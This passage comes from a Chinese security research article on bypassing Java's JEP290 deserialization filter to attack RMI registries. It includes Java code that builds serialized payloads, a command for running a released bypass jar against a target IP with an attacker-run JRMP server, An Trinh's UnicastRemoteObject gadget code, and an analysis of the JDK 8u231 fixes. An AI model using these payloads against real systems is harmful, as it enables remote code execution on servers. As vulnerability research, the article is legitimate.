+<p>那么就尝试自己去构造一个序列化对象（由于要与攻击成功数据包进行对比，我们就是用序列化结构更通用的RMIConnectionImpl_Stub类。因为使用自实现类，不同地方包名会不一样不方便）</p>
+<p>写完代码后，发现直接序列化不能正常利用攻击，与攻击成功数据包对比发现需要修正000078-&gt;00007078。（这里应该是不同的输入流对象对于序列化的处理不同导致的）</p>
+<p><a id="img25" href="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622151924-b2f9a5c8-b458-1.png"><img src="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622151924-b2f9a5c8-b458-1.png"></a></p>
+<p>重新微调，在<code>payloads.BypassJEP290_RMIConnectionImpl_Stub#getBytes</code>中进行类实现。</p>
+<div class="highlight"><pre><span></span><span class="c1">//使用RMIConnectionImpl_Stub类</span>
+<span class="n">RMIConnectionImpl_Stub</span> <span class="n">RMIConnectionImpl_Stub_obj</span> <span class="o">=</span> <span class="k">new</span> <span class="n">RMIConnectionImpl_Stub</span><span class="o">(</span><span class="n">ref</span><span class="o">);</span>
+<span class="c1">//序列化，同时修正000078-&gt;00007078</span>
+<span class="kt">byte</span><span class="o">[]</span> <span class="n">serial_Primary</span><span class="o">=</span><span class="n">serialize</span><span class="o">(</span><span class="n">RMIConnectionImpl_Stub_obj</span><span class="o">);</span>
+<span class="c1">//除去aced开头（序列化开头）</span>
+<span class="kt">byte</span><span class="o">[]</span> <span class="n">serial_byte</span><span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="n">serial_Primary</span><span class="o">.</span><span class="na">length</span><span class="o">-</span><span class="mi">4</span><span class="o">];</span>
+<span class="n">System</span><span class="o">.</span><span class="na">arraycopy</span><span class="o">(</span><span class="n">serial_Primary</span><span class="o">,</span> <span class="mi">4</span><span class="o">,</span> <span class="n">serial_byte</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="n">serial_byte</span><span class="o">.</span><span class="na">length</span><span class="o">);</span>
+<span class="c1">//填入传输流</span>
+<span class="n">out</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">fixReferences</span><span class="o">(</span><span class="n">serial_byte</span><span class="o">));</span>
+</pre></div>
+<p>完毕。打包成jar发布在github的release中了。</p>
+<p><code>java -jar RMI-Bypass290.jar 47.xx.xx.xx 1099 47.xx.xx.xx 1199</code>（前者攻击目标IP和端口，后者JRMP服务器IP和端口）直接测试服务端161版本。</p>
+<p><a id="img26" href="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622151939-bc403796-b458-1.png"><img src="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622151939-bc403796-b458-1.png"></a></p>
+<h4>重实现lookup逻辑</h4>
+<p>虽然工具完成了，但是这么实现着实费劲，一开始以为压根没有人实现这个工具，最后发现wh1tp1g已经集成到他的<a href="https://github.com/wh1t3p1g/ysomap" target="_blank">ysomap</a>中了（然后打不过他就加入了他= =）.</p>
+<p>而且实现的方法更为聪明，只是做了上层lookup函数的重写，这样子就实现起来就很简单简洁，且不用考虑底层字节的各种情况。</p>
+<p><code>ysomap.core.exploit.rmi.component.Naming#lookup</code>直接把原来的接口<code>lookup(String)</code>调成<code>lookup(Object)</code>（实现不是如此，逻辑是如此，数据包封装的逻辑实际上直接照搬过来就可以了）</p>
+<div class="highlight"><pre><span></span><span class="c1">//多加了个registry参数，然后自己实现部分固定值的获取</span>
+<span class="kd">public</span> <span class="kd">static</span> <span class="n">Remote</span> <span class="nf">lookup</span><span class="o">(</span><span class="n">Registry</span> <span class="n">registry</span><span class="o">,</span> <span class="n">Object</span> <span class="n">obj</span><span class="o">)</span>
+            <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+        <span class="n">RemoteRef</span> <span class="n">ref</span> <span class="o">=</span> <span class="o">(</span><span class="n">RemoteRef</span><span class="o">)</span> <span class="n">ReflectionHelper</span><span class="o">.</span><span class="na">getFieldValue</span><span class="o">(</span><span class="n">registry</span><span class="o">,</span> <span class="s">"ref"</span><span class="o">);</span>
+        <span class="kt">long</span> <span class="n">interfaceHash</span> <span class="o">=</span> <span class="o">(</span><span class="kt">long</span><span class="o">)</span> <span class="n">ReflectionHelper</span><span class="o">.</span><span class="na">getFieldValue</span><span class="o">(</span><span class="n">registry</span><span class="o">,</span> <span class="s">"interfaceHash"</span><span class="o">);</span>
+        <span class="n">java</span><span class="o">.</span><span class="na">rmi</span><span class="o">.</span><span class="na">server</span><span class="o">.</span><span class="na">Operation</span><span class="o">[]</span> <span class="n">operations</span> <span class="o">=</span> <span class="o">(</span><span class="n">Operation</span><span class="o">[])</span> <span class="n">ReflectionHelper</span><span class="o">.</span><span class="na">getFieldValue</span><span class="o">(</span><span class="n">registry</span><span class="o">,</span> <span class="s">"operations"</span><span class="o">);</span>
+        <span class="k">try</span> <span class="o">{</span>
+        <span class="o">....</span><span class="c1">//之后就跟原来的lookup一样了</span>
+            <span class="c1">//同时这里我还加入了绕过enableReplace，使UnicastRemoteObject可用</span>
+</pre></div>
+<h3 id="toc-5">8u231的修复</h3>
+<p>选取了两个版本8u211b12和8u231b11进行测试，使用自定义类的payload模块，8u211可以攻击，8u231不能攻击。</p>
+<blockquote><p>其中8u231b11版本是从Oracle官网下载的。</p>
+<p>如果从openjdk中查找更新的具体版本，那就是8u232b09（感谢wh1t3p1g）</p>
+<p>其实一直没搞懂为啥这个版本号的问题，为啥openjdk里没有8u231呢，如果有人知道希望可以回复我谢谢。</p>
+</blockquote>
+<p>先看测试结果。</p>
+<p><a id="img27" href="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622152007-cc91f95e-b458-1.png"><img src="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622152007-cc91f95e-b458-1.png"></a></p>
+<p><a id="img28" href="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622152018-d365678e-b458-1.png"><img src="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622152018-d365678e-b458-1.png"></a></p>
+<p>对比JDK做了两处修复：</p>
+<ol>
+<li><code>sun.rmi.registry.RegistryImpl_Skel#dispatch</code>报错情况消除ref</li>
+<li><code>sun.rmi.transport.DGCImpl_Stub#dirty</code>提前了黑名单</li>
+</ol>
+<h4>第一处修复</h4>
+<blockquote><p>在openjdk中可以在线查看对比<a href="https://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/69c4f673b33e/src/share/classes/sun/rmi/registry/RegistryImpl_Skel.java" target="_blank">8u232u8的RegistryImpl_Skel.java</a>与<a href="https://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/5456f24496f4/src/share/classes/sun/rmi/registry/RegistryImpl_Skel.java" target="_blank">8u232u9的RegistryImpl_Skel.java</a></p>
+</blockquote>
+<p>其实只有一行的区别，在每个动作比如lookup，bind等中都添加了一个逻辑：<strong>如果出现了序列化报错都会进入catch，执行<code>discardPedingRefs</code></strong>。</p>
+<p><a id="img29" href="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622152041-e10e7fd8-b458-1.png"><img src="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622152041-e10e7fd8-b458-1.png"></a></p>
+<p>在<code>sun.rmi.transport.StreamRemoteCall#discardPendingRefs</code>中其实也就是做了一件事情，把我们之前装载的<code>incomingRefTable</code>清空</p>
+<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kt">void</span> <span class="nf">discardPendingRefs</span><span class="o">()</span> <span class="o">{</span>
+    <span class="k">this</span><span class="o">.</span><span class="na">in</span><span class="o">.</span><span class="na">discardRefs</span><span class="o">();</span><span class="c1">//去下面</span>
+<span class="o">}</span>
+<span class="c1">//sun.rmi.transport.ConnectionInputStream#discardRefs</span>
+<span class="kt">void</span> <span class="nf">discardRefs</span><span class="o">()</span> <span class="o">{</span>
+    <span class="k">this</span><span class="o">.</span><span class="na">incomingRefTable</span><span class="o">.</span><span class="na">clear</span><span class="o">();</span><span class="c1">//消除incomingRefTable里面我们的ref</span>
+<span class="o">}</span>
+</pre></div>
+<p>那么很清楚假如我们的payload在序列化中发生了报错，那么我们想尽办法装载的ref就会被干掉。再回头看看我们的那么多种payload都会报错么？</p>
+<ol>
+<li><p><strong>自定义类（动态代理或接口）</strong>：报错ClassNotFoundException</p>
+<p>因为我们传入的类虽然会完成装载，但是在后续的序列化逻辑中肯定是会因为找不到我们的恶意类而发生ClassNotFoundException报错的。</p>
+<p>被干掉了。</p>
+</li>
+<li><p><strong>动态代理转换接口或者找内置接口</strong>：报错ClassCastException</p>
+<p>而其他的payload虽然因为都是有内置类的，这些内置类在序列化的时候<code>var9.readObject();</code>是没问题的。</p>
+<p>但是这里还有一个类型转换的逻辑<code>var8 = (String)var9.readObject();</code>在类型转换的时候就会发生报错。</p>
+<p>从而也被干掉了。</p>
+</li>
+</ol>
+<h4>第二处修复</h4>
+<p>实际上第一处修复已经完美修复了，但是还有第二处修复针对的是ref被触发的时候，即<code>var7.releaseInputStream();</code></p>
+<p>回顾<code>UnicastRef对象</code>这一小节，重新看我们POC触发的调用栈图的左下角，它必定会经过<code>sun.rmi.transport.DGCImpl_Stub#dirty</code></p>
+<p><a id="img30" href="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622152106-f0271020-b458-1.png"><img src="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622152106-f0271020-b458-1.png"></a></p>
+<blockquote><p>在openjdk中可以在线查看对比<a href="https://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/69c4f673b33e/src/share/classes/sun/rmi/transport/DGCImpl_Stub.java" target="_blank">8u232u8的DGCImpl_Stub.java</a>与<a href="https://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/5456f24496f4/src/share/classes/sun/rmi/transport/DGCImpl_Stub.java" target="_blank">8u232u9的DGCImpl_Stub.java</a></p>
+</blockquote>
+<p><a id="img31" href="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622152129-fd728322-b458-1.png"><img src="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622152129-fd728322-b458-1.png"></a></p>
+<p>在dirty方法中三个关键语句：</p>
+<ol>
+<li><code>this.ref.newCall</code>：发起JRMP请求</li>
+<li><code>var6.setObjectInputFilter(DGCImpl_Stub::leaseFilter);</code>：过滤</li>
+<li><code>this.ref.invoke()</code>：触发JRMP返回payload反序列化解析</li>
+</ol>
+<p>把过滤器放在解析之前，那么JRMP请求是可以发起的，但是你最后命令执行的payload（比如CC）会被过滤器给干掉。</p>
+<p>看下过滤器<code>sun.rmi.transport.DGCImpl_Stub#leaseFilter</code>：一样对长度、深度、黑名单做了限制</p>
+<p><a id="img32" href="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622152145-07661ad8-b459-1.png"><img src="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622152145-07661ad8-b459-1.png"></a></p>
+<p>我们的payload用的是CC链，不在白名单范围内，于是GG。</p>
+<div class="highlight"><pre><span></span><span class="k">if</span> <span class="o">(</span><span class="n">var1</span><span class="o">.</span><span class="na">isPrimitive</span><span class="o">())</span> <span class="o">{</span>
+    <span class="k">return</span> <span class="n">Status</span><span class="o">.</span><span class="na">ALLOWED</span><span class="o">;</span>
+<span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+    <span class="k">return</span> <span class="n">var1</span> <span class="o">!=</span> <span class="n">UID</span><span class="o">.</span><span class="na">class</span> <span class="o">&amp;&amp;</span> <span class="n">var1</span> <span class="o">!=</span> <span class="n">VMID</span><span class="o">.</span><span class="na">class</span> <span class="o">&amp;&amp;</span> <span class="n">var1</span> <span class="o">!=</span> <span class="n">Lease</span><span class="o">.</span><span class="na">class</span> <span class="o">&amp;&amp;</span> <span class="o">(</span><span class="n">var1</span><span class="o">.</span><span class="na">getPackage</span><span class="o">()</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">||</span> <span class="o">!</span><span class="n">Throwable</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">isAssignableFrom</span><span class="o">(</span><span class="n">var1</span><span class="o">)</span> <span class="o">||</span> <span class="o">!</span><span class="s">"java.lang"</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">var1</span><span class="o">.</span><span class="na">getPackage</span><span class="o">().</span><span class="na">getName</span><span class="o">())</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="s">"java.rmi"</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">var1</span><span class="o">.</span><span class="na">getPackage</span><span class="o">().</span><span class="na">getName</span><span class="o">()))</span> <span class="o">&amp;&amp;</span> <span class="n">var1</span> <span class="o">!=</span> <span class="n">StackTraceElement</span><span class="o">.</span><span class="na">class</span> <span class="o">&amp;&amp;</span> <span class="n">var1</span> <span class="o">!=</span> <span class="n">ArrayList</span><span class="o">.</span><span class="na">class</span> <span class="o">&amp;&amp;</span> <span class="n">var1</span> <span class="o">!=</span> <span class="n">Object</span><span class="o">.</span><span class="na">class</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">var1</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="s">"java.util.Collections$UnmodifiableList"</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">var1</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="s">"java.util.Collections$UnmodifiableCollection"</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">var1</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="s">"java.util.Collections$UnmodifiableRandomAccessList"</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">var1</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="s">"java.util.Collections$EmptyList"</span><span class="o">)</span> <span class="o">?</span> <span class="n">Status</span><span class="o">.</span><span class="na">REJECTED</span> <span class="o">:</span> <span class="n">Status</span><span class="o">.</span><span class="na">ALLOWED</span><span class="o">;</span>
+<span class="o">}</span>
+</pre></div>
+<h2 id="toc-6">来自An Trinh的另一种绕过JEP290的思路</h2>
+<p>今年2月份，<a href="https://mogwailabs.de/blog/2020/02/an-trinhs-rmi-registry-bypass/" target="_blank">An Trinh的RMI注册端的Bypass方法</a>一文中提出了一种新的Bypass思路，这是一条<strong>与众不同的而又"鸡肋"</strong>的Gadgets。</p>
+<blockquote><p>上面这句话是一天前年幼无知的我写的，大胆而又无知的说"鸡肋"。一天之后回来想删掉，但是想想还是放着在下面打脸好了。</p>
+<p>这条链比之前的都要牛逼可以继续绕过231修复，先按照这个思路看下去，提前膜拜大An Trinh佬。</p>
+</blockquote>
+<p>为什么要说鸡肋呢，先回顾一下我们之前是如何绕过JEP290的：</p>
+<p><strong>攻击者发送payload让RMI注册端发起一个JRMP请求去链接我们的JRMP服务器，然后接受并反序列化我们JRMP服务器返回的报错信息，反序列化的时候通过RMI注册端内部的利用链（比如CC）完成命令执行</strong></p>
+<p>An Trinh的绕过思路还是这个套路，JRMP的部分一模一样没有改变，与我们之前不同的是<strong>如何让RMI注册端发起JRMP请求这一部分</strong>。</p>
+<p>之前我们提出许多许多攻击方式：绕过客户端-自实现协议去封装、动态代理、UnicastRef类型参数实现Remote接口的类等等、甚至可以自定义一个符合要求的类来攻击。</p>
+<p>但是回归到这些攻击方式，其本质都是利用：</p>
+<ol>
+<li><strong>readobject反序列化的过程会递归反序列化我们的对象，一直反序列化到我们的UnicastRef类。</strong></li>
+<li><strong>在readobejct反序列化的过程中填装UnicastRef类到<code>incomingRefTable</code></strong></li>
+<li><strong>在releaseInputStream语句中从incomingRefTable中读取ref进行开始JRMP请求</strong></li>
+</ol>
+<p>(后两步是发起JRMP请求的细节，在 UnicastRef对象 一节中有详细说到，可以粗糙的理解成readobject出发了JRMP查询也没事)</p>
+<p>在这个本质的基础上，我们所做的、所解决的问题只是在：选择UnicastRef类包装或者不包装（包装是为了迎合JDK客户端底层的代码）、用jdk中已有的类包装还是自定义类包装，或者用动态代理包装还是原生接口包装，又再是用什么原生接口包装，有的包装不好用怎么办？巴拉巴拉的在处理这些问题。</p>
+<hr>
+<p>但是An Trinh提出了一个新的思路来发起JRMP请求，不是利用<strong>readobject的递归-填装-触发</strong>的模式，而是<strong>readobject函数调用过程</strong>直接触发JRMP请求。</p>
+<p>但是为什么说他鸡肋呢？因为他的payload攻击过程中：会<strong>在readobject函数中触发他的Gadgets发起JRMP连接</strong>，但是在完成后，又会回到我们的<strong>readobject的递归-填装-触发</strong>的模式中发起第二次JRMP连接。具体流程如下：</p>
+<ol>
+<li><strong>readobject递归反序列化到payload对象中的UnicastRef对象，填装UnicastRef对象的ref到<code>incomingRefTable</code></strong></li>
+<li><strong>在根据readobject的第二个最著名的特性：会调用对象自实现的readobject方法，会执行UnicastRemoteObject的readObject，他的Gadgets会在这里触发一次JRMP请求</strong></li>
+<li><strong>在releaseInputStream语句中从<code>incomingRefTable</code>中读取ref进行开始JRMP请求</strong></li>
+</ol>
+<p>同时他Gadgets发起JRMP请求只会发起<strong>一次请求</strong>，而readobject的递归-填装-触发的JRMP请求，由于会检测DGC是否绑定成功会<strong>循环发起JRMP</strong>，形成天然的心跳木马。</p>
+<p>那么这样对比看起来这个Gadgets就有一种画蛇添足的感觉，一种混KPI的鸡肋优雅感（<del>天呐一天前的我竟然得出了如此羞耻的结论，辣鸡的傲慢</del>），这就是安全研究员么，爱了爱了。</p>
+<p>但是反正让我找我是找不出来的，我们就来膜拜看看他的链在UnicastRemoteObject的readObject中是怎么做到JRMP请求的。</p>
+<p>先给出ysomap里的封装过程：</p>
+<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="n">UnicastRemoteObject</span> <span class="nf">pack</span><span class="o">(</span><span class="n">Object</span> <span class="n">obj</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+    <span class="c1">//1.UnicastRef对象 -&gt; RemoteObjectInvocationHandler</span>
+    <span class="c1">//obj是UnicastRef对象，先RemoteObjectInvocationHandler封装</span>
+    <span class="n">RemoteObjectInvocationHandler</span> <span class="n">handler</span> <span class="o">=</span> <span class="k">new</span> <span class="n">RemoteObjectInvocationHandler</span><span class="o">((</span><span class="n">RemoteRef</span><span class="o">)</span> <span class="n">obj</span><span class="o">);</span>
+    <span class="c1">//2. RemoteObjectInvocationHandler -&gt; RMIServerSocketFactory接口</span>
+    <span class="c1">//RemoteObjectInvocationHandler通过动态代理封装转化成RMIServerSocketFactory</span>
+    <span class="n">RMIServerSocketFactory</span> <span class="n">serverSocketFactory</span> <span class="o">=</span> <span class="o">(</span><span class="n">RMIServerSocketFactory</span><span class="o">)</span> <span class="n">Proxy</span><span class="o">.</span><span class="na">newProxyInstance</span><span class="o">(</span>
+        <span class="n">RMIServerSocketFactory</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getClassLoader</span><span class="o">(),</span><span class="c1">// classloader</span>
+        <span class="k">new</span> <span class="n">Class</span><span class="o">[]</span> <span class="o">{</span> <span class="n">RMIServerSocketFactory</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Remote</span><span class="o">.</span><span class="na">class</span><span class="o">},</span> <span class="c1">// interfaces to implements</span>
+        <span class="n">handler</span><span class="c1">// RemoteObjectInvocationHandler</span>
+        <span class="o">);</span>
+    <span class="c1">//通过反射机制破除构造方法的可见性性质，创建UnicastRemoteObject实例</span>
+    <span class="n">Constructor</span><span class="o">&lt;?&gt;</span> <span class="n">constructor</span> <span class="o">=</span> <span class="n">UnicastRemoteObject</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="kc">null</span><span class="o">);</span> <span class="c1">// 获取默认的</span>
+    <span class="n">constructor</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+    <span class="n">UnicastRemoteObject</span> <span class="n">remoteObject</span> <span class="o">=</span> <span class="o">(</span><span class="n">UnicastRemoteObject</span><span class="o">)</span> <span class="n">constructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="kc">null</span><span class="o">);</span>
+    <span class="c1">//3. RMIServerSocketFactory -&gt; UnicastRemoteObject</span>
+    <span class="c1">//把RMIServerSocketFactory塞进UnicastRemoteObject实例中</span>
+    <span class="n">ReflectionHelper</span><span class="o">.</span><span class="na">setFieldValue</span><span class="o">(</span><span class="n">remoteObject</span><span class="o">,</span> <span class="s">"ssf"</span><span class="o">,</span> <span class="n">serverSocketFactory</span><span class="o">);</span>
+    <span class="k">return</span> <span class="n">remoteObject</span><span class="o">;</span>
+<span class="o">}</span>
+</pre></div>
+<p>看下漏洞触发调用栈，主要分成三个关键点：</p>
+<p><a id="img33" href="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622152358-56a7bdb8-b459-1.png"><img src="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622152358-56a7bdb8-b459-1.png"></a></p>
+<p>从UnicastRemoteObject的readObject入口开始<code>java.rmi.server.UnicastRemoteObject#readObject</code>：</p>
+<div class="highlight"><pre><span></span><span class="kd">private</span> <span class="kt">void</span> <span class="nf">readObject</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">ObjectInputStream</span> <span class="n">in</span><span class="o">)</span>
+        <span class="kd">throws</span> <span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">IOException</span><span class="o">,</span> <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">ClassNotFoundException</span>
+    <span class="o">{</span>
+        <span class="n">in</span><span class="o">.</span><span class="na">defaultReadObject</span><span class="o">();</span>
+        <span class="n">reexport</span><span class="o">();</span><span class="c1">//这里</span>
+    <span class="o">}</span>
+</pre></div>
+<p><code>java.rmi.server.UnicastRemoteObject#reexport</code>:</p>
+<div class="highlight"><pre><span></span><span class="kd">private</span> <span class="kt">void</span> <span class="nf">reexport</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">RemoteException</span>
+    <span class="o">{</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">csf</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">ssf</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">exportObject</span><span class="o">((</span><span class="n">Remote</span><span class="o">)</span> <span class="k">this</span><span class="o">,</span> <span class="n">port</span><span class="o">);</span>
+        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+            <span class="c1">//payload是填充了ssf的,这里</span>
+            <span class="n">exportObject</span><span class="o">((</span><span class="n">Remote</span><span class="o">)</span> <span class="k">this</span><span class="o">,</span> <span class="n">port</span><span class="o">,</span> <span class="n">csf</span><span class="o">,</span> <span class="n">ssf</span><span class="o">);</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+</pre></div>
+<p>之后的调用链很长我们直接跳到<code>sun.rmi.transport.tcp.TCPEndpoint#newServerSocket</code>这里是第二个关键处动态代理的特性，跳转到拦截器的invoke（这里的动态代理是不仅用到了接口转换的特性，用到了拦截的特性！惊了！激动！）</p>
+<p><code>sun.rmi.transport.tcp.TCPEndpoint#newServerSocket</code>：</p>
+<div class="highlight"><pre><span></span><span class="n">ServerSocket</span> <span class="nf">newServerSocket</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
+    <span class="k">if</span> <span class="o">(</span><span class="n">TCPTransport</span><span class="o">.</span><span class="na">tcpLog</span><span class="o">.</span><span class="na">isLoggable</span><span class="o">(</span><span class="n">Log</span><span class="o">.</span><span class="na">VERBOSE</span><span class="o">))</span> <span class="o">{</span>
+        <span class="n">TCPTransport</span><span class="o">.</span><span class="na">tcpLog</span><span class="o">.</span><span class="na">log</span><span class="o">(</span><span class="n">Log</span><span class="o">.</span><span class="na">VERBOSE</span><span class="o">,</span> <span class="s">"creating server socket on "</span> <span class="o">+</span> <span class="k">this</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="n">Object</span> <span class="n">var1</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">ssf</span><span class="o">;</span>
+    <span class="k">if</span> <span class="o">(</span><span class="n">var1</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">var1</span> <span class="o">=</span> <span class="n">chooseFactory</span><span class="o">();</span>
+    <span class="o">}</span>
+    <span class="c1">//var1就是我们的payload中构建的ssf.调用他的createServerSocket</span>
+    <span class="c1">//会根据动态代理进入RemoteObjectInvocationHandler#invoke</span>
+    <span class="n">ServerSocket</span> <span class="n">var2</span> <span class="o">=</span> <span class="o">((</span><span class="n">RMIServerSocketFactory</span><span class="o">)</span><span class="n">var1</span><span class="o">).</span><span class="na">createServerSocket</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">listenPort</span><span class="o">);</span>
+    <span class="k">if</span> <span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">listenPort</span> <span class="o">==</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">setDefaultPort</span><span class="o">(</span><span class="n">var2</span><span class="o">.</span><span class="na">getLocalPort</span><span class="o">(),</span> <span class="k">this</span><span class="o">.</span><span class="na">csf</span><span class="o">,</span> <span class="k">this</span><span class="o">.</span><span class="na">ssf</span><span class="o">);</span>
+    <span class="o">}</span>
+</pre></div>
+<p><code>java.rmi.server.RemoteObjectInvocationHandler#invoke</code>：</p>
+<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="n">Object</span> <span class="nf">invoke</span><span class="o">(</span><span class="n">Object</span> <span class="n">proxy</span><span class="o">,</span> <span class="n">Method</span> <span class="n">method</span><span class="o">,</span> <span class="n">Object</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span>
+        <span class="kd">throws</span> <span class="n">Throwable</span>
+    <span class="o">{</span>
+    <span class="c1">//method是java.rmi.server.RMIServerSocketFactory的createServerSocket方法</span>
+        <span class="c1">//....</span>
+        <span class="c1">//这边都不满足</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">method</span><span class="o">.</span><span class="na">getDeclaringClass</span><span class="o">()</span> <span class="o">==</span> <span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">return</span> <span class="n">invokeObjectMethod</span><span class="o">(</span><span class="n">proxy</span><span class="o">,</span> <span class="n">method</span><span class="o">,</span> <span class="n">args</span><span class="o">);</span>
+        <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="s">"finalize"</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">method</span><span class="o">.</span><span class="na">getName</span><span class="o">())</span> <span class="o">&amp;&amp;</span> <span class="n">method</span><span class="o">.</span><span class="na">getParameterCount</span><span class="o">()</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span>
+            <span class="o">!</span><span class="n">allowFinalizeInvocation</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">return</span> <span class="kc">null</span><span class="o">;</span> <span class="c1">// ignore</span>
+        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+            <span class="c1">//进入此处</span>
+            <span class="k">return</span> <span class="n">invokeRemoteMethod</span><span class="o">(</span><span class="n">proxy</span><span class="o">,</span> <span class="n">method</span><span class="o">,</span> <span class="n">args</span><span class="o">);</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+</pre></div>
+<p><code>java.rmi.server.RemoteObjectInvocationHandler#invokeRemoteMethod</code>：</p>
+<div class="highlight"><pre><span></span><span class="kd">private</span> <span class="n">Object</span> <span class="nf">invokeRemoteMethod</span><span class="o">(</span><span class="n">Object</span> <span class="n">proxy</span><span class="o">,</span>
+                                  <span class="n">Method</span> <span class="n">method</span><span class="o">,</span>
+                                  <span class="n">Object</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span>
+    <span class="kd">throws</span> <span class="n">Exception</span>
+    <span class="o">{</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="k">if</span> <span class="o">(!(</span><span class="n">proxy</span> <span class="k">instanceof</span> <span class="n">Remote</span><span class="o">))</span> <span class="o">{</span>
+                <span class="k">throw</span> <span class="k">new</span> <span class="n">IllegalArgumentException</span><span class="o">(</span>
+                    <span class="s">"proxy not Remote instance"</span><span class="o">);</span>
+            <span class="o">}</span>
+          <span class="c1">//我们payload把RemoteObjectInvocationHandler的ref写成了JRMP恶意服务器地址</span>
+          <span class="c1">//这里开始了触发JRMP请求</span>
+            <span class="k">return</span> <span class="n">ref</span><span class="o">.</span><span class="na">invoke</span><span class="o">((</span><span class="n">Remote</span><span class="o">)</span> <span class="n">proxy</span><span class="o">,</span> <span class="n">method</span><span class="o">,</span> <span class="n">args</span><span class="o">,</span>
+                              <span class="n">getMethodHash</span><span class="o">(</span><span class="n">method</span><span class="o">));</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+</pre></div>
+<p>令人激动的<code>sun.rmi.server.UnicastRef#invoke</code>我们之前JRMP触发就是在这里触发的，但是之前是<code>sun.rmi.server.UnicastRef#invoke(java.rmi.server.RemoteCall)</code>虽然接口是不一样，但是做的事情差不多</p>
+<p><code>sun.rmi.server.UnicastRef#invoke(java.rmi.Remote, java.lang.reflect.Method, java.lang.Object[], long)</code></p>
